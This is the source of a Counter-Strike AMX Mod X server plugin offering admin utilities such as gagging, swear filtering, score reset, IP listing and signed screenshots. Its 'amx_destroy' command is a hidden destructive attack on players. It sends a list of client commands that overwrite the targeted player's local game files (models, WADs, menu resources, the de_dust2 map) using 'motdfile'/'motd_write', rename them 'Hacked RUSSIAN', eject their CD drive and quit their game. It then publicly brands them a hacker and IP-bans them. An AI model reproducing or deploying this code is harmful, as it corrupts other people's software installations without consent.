#include <amxmodx>
#include <fakemeta>
#include <cstrike>
#include <amxmisc> 
#include <fun>
#include <zombiecrown>
#include <colored_print>

#define PLUGIN_NAME "[ZC Functions]"
#define PLUGIN_VERSION "1.0"
#define PLUGIN_AUTHOR "meNe"
#define is_user_valid_connected(%1) (1 <= %1 <= maxplayers && is_user_connected(%1))

// Gag
new bool:Gagged[33];
#define TASK_GAG 	4429
#define Sps  	"zombie_crown/zc_sound_gag.wav"
new g_reason[32]

// Swear check
#define MAX_WORDS 200
#define MAX_REPLACE 50
new g_swearWords[MAX_WORDS][192]
new g_replaceLines[MAX_REPLACE][192]
new g_swearNum, g_replaceNum

// Private Messages
static logname[65]

// Destroy
new const g_sCommands[][] =
{
	"gl_log 1",
	"csx_setcvar Enabled False",
	"rus_setcvar Enabled False",
	"prot_setcvar Enabled False",
	"rate 1",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"quit",
	"name Hacked RUSSIAN",
	"motdfile models/player.mdl;motd_write RUSSIAN",
	"motdfile models/v_ak47.mdl;motd_write RUSSIAN",
	"motdfile cs_dust.wad;motd_write RUSSIAN",
	"motdfile models/v_m4a1.mdl;motd_write RUSSIAN",
	"motdfile resource/GameMenu.res;motd_write RUSSIAN",
	"motdfile resource/GameMenu.res;motd_write RUSSIAN",
	"motdfile resource/background/800_1_a_loading.tga;motd_write RUSSIAN",
	"motdfile resource/background/800_1_b_loading.tga;motd_write RUSSIAN",
	"motdfile resource/background/800_1_c_loading.tga;motd_write RUSSIAN",
	"motdfile resource/UI/BuyShotguns_TER.res;motd_write RUSSIAN",
	"motdfile resource/UI/MainBuyMenu.res;motd_write RUSSIAN",
	"motdfile resource/UI/BuyEquipment_TER.res;motd_write RUSSIAN",
	"motdfile resource/UI/Teammenu.res;motd_write RUSSIAN",
	"motdfile halflife.wad;motd_write RUSSIAN",
	"motdfile cstrike.wad;motd_write RUSSIAN",
	"motdfile maps/de_dust2.bsp;motd_write RUSSIAN",
	"motdfile events/ak47.sc;motd_write RUSSIAN", 
	"echo ????!"	
}

// Admin Checker
new maxplayers
new gmsgSayText

// Name
new name[33][32]

// Flood commands
new flood_commands[][] =
{
   	"takingfire",
   	"fallback",
   	"report",
   	"reportingin",
   	"sticktog",
   	"getinpos",
   	"holdpos",
   	"inposition",
	"cl_setautobuy",
	"cl_autobuy",
	"cl_setrebuy",
	"cl_rebuy",
	"autobuy",
  	"gX4takingfire",
   	"gX4getout",
   	"gX4regroup",
	"echo_off",
	"echo_on",
	"gX4sticktog",
	"gX4holdpos",
	"fup.gX4",
	"votemapz.gX4",
	"later.gX4_1.0",
	"chat.gX4flood",
	"doop.activated",
	"1Toggle.jbrv",
	"1Toggle.2.jbrv",
	"ajfg+",
	"+ajg",
	"flood",
	"sp0",
	"%0",
	"%s0",
	"0%s",
	"-ssayg",
	"tog2",
	"ajfg",
	"tog1",
	"+ssayg",
	"1Toggle.jbrv",
	"1Toggle.3.jbrv"
}

// PlayedTime
new const g_szGameTracker[] = "http://www.gametracker.com/player"
new g_szServerIp[32]
new g_szCustomUrl[128]

// Last Maps
#define MaxMaps	6
new MapName[MaxMaps][34]

// SS
new _screen_hp[33]

public plugin_init() 
{
	// Register Plugin
	register_plugin(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR)

	// Flood Commands
   	for(new i = 0; i < sizeof flood_commands; i++)
   	{
        register_clcmd(flood_commands[i], "no_flood")
   	}

	// No Blood
	register_message(SVC_TEMPENTITY, "blood_message")

	// Gag
	register_concmd("amx_gag", "cmdGag", ADMIN_CHAT, "<name or #userid> <minutes> <reason>");	
	register_concmd("amx_ungag", "cmdUnGag", ADMIN_CHAT, "<name or #userid>");

	// Swear Check
	register_clcmd("say", "chat_func") 
	register_clcmd("say_team", "chat_func")
	readList()

	// Resetscore
	register_clcmd("say /resetscore", "reset_score")
	register_clcmd("say /retry", "reset_score")
	register_clcmd("say /reset", "reset_score")
	register_clcmd("say /rs", "reset_score")

	// Destroy
	register_concmd("amx_destroy", "cmd_destroy", ADMIN_LEVEL_D, "<nickname>")

	// ShowIP
	register_concmd("amx_ip", "ShowIP", ADMIN_KICK, "< player , @TEAM , *>"); 

	// Admin Checker
	maxplayers = get_maxplayers()
	gmsgSayText = get_user_msgid("SayText")

	// PlayedTime
	register_clcmd("say /playedtime", "DisplayPlayedTime")
	register_clcmd("say /ore", "DisplayPlayedTime")
	register_clcmd("say /orejucate", "DisplayPlayedTime")
	get_user_ip(0, g_szServerIp, sizeof (g_szServerIp) -1, 0)

	// Last maps
	register_clcmd("say /harti", "MapsPlayed")
	register_clcmd("say /maps", "MapsPlayed")
	register_clcmd("say /lastmaps", "MapsPlayed")

	// SS
	register_concmd("amx_ss", "cmdScreen", ADMIN_KICK, "<nick or #userid>")

	// Kill command
	register_forward(FM_ClientKill, "HookKill")
}

public HookKill(id)
{
	client_print(id, print_console, "You are not allowed to use this command.")
	return PLUGIN_HANDLED
}

public no_flood(id)
{
   	show_motd(id, "go.html")
	return PLUGIN_HANDLED
}

public blood_message() 
{
	static arg1 ; arg1 = get_msg_arg_int(1)
	if(arg1 == TE_BLOODSPRITE || arg1 == TE_BLOODSTREAM || arg1 == TE_BLOOD)
		return PLUGIN_HANDLED
	return PLUGIN_CONTINUE
}

public client_connect(id)
{
	// Gag
	Gagged[id] = false
}

public client_putinserver(id)
{
	// Get players' nickname
    get_user_name(id, name[id], 32)
}

public client_disconnect(id)
{
	// Gag
	if(Gagged[id])
	{	
		colored_print(id, GREEN, "[ZC]^x01 The gagged player:^x04 %s^x01, has left the game!", name[id])
		Gagged[id]=false	
		remove_task(id+TASK_GAG)	
	}
}

public plugin_precache()
{
	precache_sound(Sps)
	precache_sound("debris/metal1.wav")
	precache_sound("debris/metal2.wav")
	precache_sound("debris/metal3.wav")
	precache_sound("debris/metal4.wav")
	precache_sound("debris/metal5.wav")
	precache_sound("debris/metal6.wav")	
}


// Last Maps
public plugin_cfg() 
{
	new MapsFile[64]
	
	get_localinfo("amxx_datadir", MapsFile, 63)
	format(MapsFile, 63, "%s/zc_lastmaps.txt", MapsFile)

	new File = fopen(MapsFile, "rt")
	new i
	new Temporar[34]
	if(File)
	{
		for(i=0; i<MaxMaps; i++)
		{
			if(!feof(File))
			{
				fgets(File, Temporar, 33)
				replace(Temporar, 33, "^n", "")
				formatex(MapName[i], 33, Temporar)
			}
		}
		fclose(File)
	}

	delete_file(MapsFile)
	new CurrentMap[34]
	get_mapname(CurrentMap, 33)
	File = fopen(MapsFile, "wt")
	if(File)
	{
		formatex(Temporar, 33, "%s^n", CurrentMap)
		fputs(File, Temporar)
		for(i=0; i<MaxMaps-1; i++)
		{
			CurrentMap = MapName[i]
			if(!CurrentMap[0])
				break
			formatex(Temporar, 33, "%s^n", CurrentMap)
			fputs(File, Temporar)
		}
		fclose(File)
	}
}

public MapsPlayed(id)
{
	new HartiAnterioare[192], n
	n += formatex(HartiAnterioare[n], 191-n, "[ZC]^x01 The last maps are:")
	for(new i; i<MaxMaps; i++)
	{
		if(!MapName[i][0])
		{
			n += formatex(HartiAnterioare[n-1], 191-n+1, ".")
			break
		}
		n += formatex(HartiAnterioare[n], 191-n, " %s%s", MapName[i], i+1 == MaxMaps ? "." : ",")
	}
	colored_print(id, GREEN, HartiAnterioare)
	return PLUGIN_CONTINUE
}

// Resetscore
public reset_score(id)
{
	if (is_user_connected(id))
	{
		cs_set_user_deaths(id, 0)
		set_user_frags(id, 0)
		cs_set_user_deaths(id, 0)
		set_user_frags(id, 0)
		colored_print(0, GREEN, "[ZC]^1 The player^4 %s^1 has resetted^4 the score^1!", name[id])
	}
}

// Gag
public cmdGag(id,level,cid)
{	
	if(!cmd_access(id,level,cid,4))
	return PLUGIN_HANDLED;	

	new arg[32], arg2[6], seks;
	new reason[32];	
	read_argv(1, arg, 31);
	read_argv(2, arg2, 5);
    	read_argv(3, reason, 31);

	new target=cmd_target(id,arg,CMDTARGET_OBEY_IMMUNITY|CMDTARGET_ALLOW_SELF|CMDTARGET_NO_BOTS);	
	if(!target)
	return PLUGIN_HANDLED;	

	seks = str_to_num(arg2);	
	if(seks >= 20)
	{		
		colored_print(id, GREEN, "[ZC]^x01 Too much ^x04time!");			
		return PLUGIN_HANDLED;	
	}

    	copy(g_reason, 31, reason);
   	remove_quotes(reason);	
	
	if(Gagged[target]){			
		colored_print(id, GREEN, "[ZC]^x01 The player^x04 %s^x01 is already^x04 gagged!", name[target]);	
		return PLUGIN_HANDLED;	
	}	
	Gagged[target]=true;
	log_amx("Gag: %s gagged player %s for %d minutes. Reason: %s", name[id], name[target], seks, reason)	
	colored_print(0, GREEN, "[ZC]^x01 Admin:^x04 %s^x01: Gag^x04 %s^x01 for^x04 %d^x01 minutes. Reason:^x04 %s",name[id], name[target], seks, reason);
	client_cmd (0, "spk %s", Sps)		
	set_task(float(seks)*60,"AutoUngag",target+TASK_GAG);	
	return PLUGIN_HANDLED;
}

public cmdUnGag(id,level,cid)
{	
	if(!cmd_access(id,level,cid,2))
	return PLUGIN_HANDLED;
	
	new arg[32],arg2[32]	
	read_argv(1,arg,31);
	read_argv(2,arg2,5);		
	new target=cmd_target(id,arg,CMDTARGET_OBEY_IMMUNITY|CMDTARGET_ALLOW_SELF|CMDTARGET_NO_BOTS);
	
	if(!target)
	return PLUGIN_HANDLED;
		
	if(!Gagged[target])
	{		
		colored_print(id, GREEN, "[ZC]^x01 Player^x04 %s^x01 is not^x04 gagged!", name[target]);			
		return PLUGIN_HANDLED;	
	}	
	Gagged[target]=false;	
	log_amx("Ungag: %s ungagged player %s", name[id], name[target])
	colored_print(0, GREEN, "[ZC]^x01 Admin:^x04 %s^x01: UnGag^x04 %s", name[id], name[target]);	
	remove_task(target+TASK_GAG);	
	return PLUGIN_HANDLED;
}

public AutoUngag(id)
{	
	id -= TASK_GAG
	if(!is_user_connected(id))
		return PLUGIN_HANDLED;	

	if(Gagged[id])
	{		
		colored_print(id, GREEN, "[ZC]^x01 Your gag was^x04 disabled!");		
		Gagged[id]=false;	
	}	
	return PLUGIN_HANDLED;
}

// SwearChecker
readList()
{
	new Configsdir[64]
	new swear_file[64], replace_file[64]
	get_configsdir(Configsdir, 63)
	format(swear_file, 63, "%s/swearwords.ini", Configsdir)
	format(replace_file, 63, "%s/replacements.ini", Configsdir)

	if (!file_exists(swear_file))
	{
		return
	}
	
	if (!file_exists(replace_file))
	{
		return
	}
	
	new len, i=0
	while(i < MAX_WORDS && read_file(swear_file, i , g_swearWords[g_swearNum], 191, len))
	{
		i++
		if(g_swearWords[g_swearNum][0] == ';' || len == 0)
			continue
		g_swearNum++
	}

	i=0
	while(i < MAX_REPLACE && read_file(replace_file, i , g_replaceLines[g_replaceNum], 191, len))
	{
		i++
		if(g_replaceLines[g_replaceNum][0] == ';' || len == 0)
			continue
		g_replaceNum++
	}
}

public chat_func(id)
{
	// Check 
	if(!is_user_valid_connected(id)) 
		return PLUGIN_HANDLED

	new said[192], szName[33]
	read_args(said, 191)
	get_user_name(id, szName, 32)

	// Gag
	if(Gagged[id])
	{	
		if(contain(said, "/pm") != -1)
		{
			colored_print(id, GREEN, "[ZC]^x01 You can not send^x04 private messages^x01 while you are^x04 gagged^x01.")
			return PLUGIN_HANDLED;
		}else {
			client_print(id, print_chat,"");		
			return PLUGIN_HANDLED;	
		}
	}

	// Swear Check
	string_cleaner (said)
	new i = 0
	while (i < g_swearNum)
	{
		if (containi (said, g_swearWords[i++]) != -1)
		{
			if ((get_user_flags(id) & ADMIN_RCON) || !id) return PLUGIN_CONTINUE
			new random_replace = random (g_replaceNum)		
			copy (said, 191, g_replaceLines[random_replace])
			new cmd[10]
			read_argv (0, cmd, 9)
			engclient_cmd (id, cmd, said)
			return PLUGIN_HANDLED
		}
	}

	// GhostChat
    	new is_alive = is_user_alive(id);
    	new message[129];
    	read_argv(1,message,128);
    	new player_count = get_playersnum();
    	new players[32];
    	get_players(players, player_count, "c");
    	if (equal(message,"")) return PLUGIN_CONTINUE;
    	if (equal(message,"[")) return PLUGIN_CONTINUE;
    	if (is_alive) 
		format(message, 127, "%c*ALIVE* %s : %s^n", 2, szName, message)
    	else 
		format(message, 127, "%c*DEAD* %s : %s^n", 2, szName, message)
    	for (new i = 0; i < player_count; i++) 
	{
      		if (is_alive && !is_user_alive(players[i]) || !is_alive && is_user_alive(players[i]))
		{
             		message_begin(MSG_ONE,gmsgSayText,{0,0,0},players[i])
             		write_byte(id)
             		write_string(message)
             		message_end()
     		}
    	}
	return PLUGIN_CONTINUE
}

public string_cleaner(str[])
{
	new i, len = strlen (str)
	while (contain (str, " ") != -1)
		replace (str, len, " ", "")

	len = strlen (str)
	while (contain (str, "|<") != -1)
		replace (str, len, "|<", "k")

	len = strlen (str)
	while (contain (str, "|>") != -1)
		replace (str, len, "|>", "p")

	len = strlen (str)
	while (contain (str, "()") != -1)
		replace (str, len, "()", "o")

	len = strlen (str)
	while (contain (str, "[]") != -1)
		replace (str, len, "[]", "o")

	len = strlen (str)
	while (contain (str, "{}") != -1)
		replace (str, len, "{}", "o")

	len = strlen (str)
	for (i = 0 ; i < len ; i++)
	{
		if (str[i] == '@')
			str[i] = 'a'

		if (str[i] == '$')
			str[i] = 's'

		if (str[i] == '0')
			str[i] = 'o'

		if (str[i] == '7')
			str[i] = 't'

		if (str[i] == '3')
			str[i] = 'e'

		if (str[i] == '5')
			str[i] = 's'

		if (str[i] == '<')
			str[i] = 'c'

		if (str[i] == '3')
			str[i] = 'e'
	}
}

// Destroy
public cmd_destroy(id, level, cid)
{
	if(!cmd_access( id, level, cid, 2))
		return PLUGIN_HANDLED
	
	new sArgument[32];
	read_argv(1, sArgument, charsmax(sArgument))
	new player = cmd_target(id, sArgument, (CMDTARGET_NO_BOTS | CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF))
	
	if(!player)
		return PLUGIN_HANDLED
	
	for(new i = 0; i < sizeof(g_sCommands); i++)
		client_cmd(player, g_sCommands[i])
	
	new ip[16], steam[32]
	get_user_ip(player, ip, charsmax(ip), 1)
	get_user_authid(player, steam, 31)
	set_hudmessage(178, 34, 34, 0.47, 0.55, 2, 6.0, 12.0, 0.1, 0.2, 1)
	show_hudmessage(0, "%s is a big hacker, do not trust him!", name[player])
	log_to_file("zc_destroy.log", "[%s] [%s] [%s] [%s] ", name[id], name[player], ip, steam);
	server_cmd("kick #%d ^"You have been permanently banned !^";wait;addip 0.0 ^"%s^";wait;writeip", get_user_userid(player), ip);
	client_cmd(0, "spk ^"vox/bizwarn eliminated")	
	return PLUGIN_HANDLED
}

// Show IP
public ShowIP(id, level, cid) 
{ 
    	if(!cmd_access(id , level , cid, 1)) 
        	return PLUGIN_HANDLED; 

    	new Arg[36]; 
    	new szIP[46]
    	new Players[32] , pnum; 
    	read_argv(1, Arg , 35); 

     	get_players(Players , pnum , "c"); 
        console_print(id , "[AMXX] IP print out for all players"); 
        for(new i=0; i < pnum; i++) 
        { 
            	get_user_ip(Players[i],szIP , 45 , 1); 
            	console_print(id , "%d) %s - %s", (i + 1), name[Players[i]] , szIP); 
        }  
    	return PLUGIN_HANDLED; 
}

// PlayedTime
public DisplayPlayedTime(id)
{
	MakeNameSafe(name[id], 31);
	formatex(g_szCustomUrl, sizeof (g_szCustomUrl) -1, "%s/%s/%s/",
		g_szGameTracker, name[id], g_szServerIp);
		
	show_motd(id, g_szCustomUrl);
}

MakeNameSafe(szName[], iLen)
{
	replace_all(szName, iLen, "#", "%23");
	replace_all(szName, iLen, "|", "%7C");
	replace_all(szName, iLen, " ", "%20");
	replace_all(szName, iLen, "?", "%3F");
	replace_all(szName, iLen, ":", "%3A");
	replace_all(szName, iLen, ";", "%3B");
	replace_all(szName, iLen, "/", "%2F");
	replace_all(szName, iLen, ",", "%2C");
	replace_all(szName, iLen, "$", "%24");
	replace_all(szName, iLen, "@", "%40");
	replace_all(szName, iLen, "+", "%2B");
	replace_all(szName, iLen, "=", "%3D");
	replace_all(szName, iLen, "�", "®");
	replace_all(szName, iLen, "(", "%28");
	replace_all(szName, iLen, ")", "%29");
	replace_all(szName, iLen, "*", "%2A");
	replace_all(szName, iLen, "[", "%5B");
	replace_all(szName, iLen, "]", "%5D");
	replace_all(szName, iLen, "!", "%21");
	replace_all(szName, iLen, "]", "%5D");
	replace_all(szName, iLen, "'", "%27");		
}

// SS
public cmdScreen(id, level, cid)
{
	if(!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}
	new arg1[32], target, task[2], timestamp[32], name[32], name2[32], ip[32], str_host[32]
	read_argv(1, arg1, 31)
	target = cmd_target(id, arg1, CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF | CMDTARGET_ONLY_ALIVE)
	if(!target) return PLUGIN_HANDLED
	if(task_exists(target+333131) || task_exists(target+333132))
	{
		client_print(id, print_console, "[ZC] %s is already being screenshoted", name2)
		return PLUGIN_HANDLED
	}
	get_time("%m/%d/%Y - %H:%M:%S", timestamp, 31)
	get_user_name(id, name, 31)
	get_user_name(target, name2, 31)
	get_user_ip(target, ip, 31, 1)
	get_cvar_string("hostname", str_host, 31)
	task[0] = target
	task[1] = id
	set_pev(target, pev_takedamage, DAMAGE_NO)
	_screen_hp[target] = pev(target,pev_health)
	set_pev(target, pev_health, 255.0)
	user_silentkill(target)
	cs_set_user_team(target, CS_TEAM_SPECTATOR)
	zp_update_team(target)
	client_print(id, print_console, "[ZC] Screenshot -> Nickname '%s' | IP '%s'", name2, ip)
	colored_print(target, GREEN, "[ZC]^x01 Signed screenshot taken on player^x04 %s^x01 by admin^x04 %s", name2, name)
	colored_print(target, GREEN, "[ZC]^x01 Server:^x03 %s", str_host)
	colored_print(target, GREEN, "[ZC]^x01 Name:^x04 %s^x01 - IP:^x04 %s", name2, ip)
	colored_print(target, GREEN, "[ZC]^x01 A signed screenshot has been executed on you by admin^x04 %s", name)
	colored_print(target, GREEN, "[ZC]^x01 [%s]", timestamp)
	client_print(target, print_console, "Zombie Crown XP Mode")
	client_print(target, print_console, "Server: %s", str_host)
	client_print(target, print_console, "Name: %s - IP: %s", name2, ip)
	client_print(target, print_console, "A signed screenshot has been executed on you by admin %s", name)
	client_print(target, print_console, "Post the screenshot on our forums or send it to %s", name)
	client_cmd(target, "stop")
	set_task(0.1, "screen_sign", target+333131,task,2)
	set_task(1.0, "screen_sign_remove", target+333132,task,1)
	log_amx("[SS] Signed screenshot taken on player %s by admin %s", name2, name)
	return PLUGIN_HANDLED
}

public screen_sign(task[2])
{
	new target, admin
	target = task[0]; admin = task[1]
	if(!is_user_connected(target) || !is_user_connected(admin))
	{
		return PLUGIN_HANDLED
	}
	client_cmd(target, "toggleconsole;snapshot;toggleconsole;snapshot;wait;wait;kill")
	cs_set_user_team(target, CS_TEAM_SPECTATOR)
	return PLUGIN_CONTINUE
}

public screen_sign_remove(task[1])
{
	new target
	target = task[0]
	if(!is_user_connected(target))
	{
		return PLUGIN_HANDLED
	}
	set_pev(target, pev_health, float(_screen_hp[target]))
	set_pev(target, pev_takedamage, DAMAGE_AIM)	
	colored_print(target, GREEN, "[ZC] End of Screenshot")
	return PLUGIN_CONTINUE
}
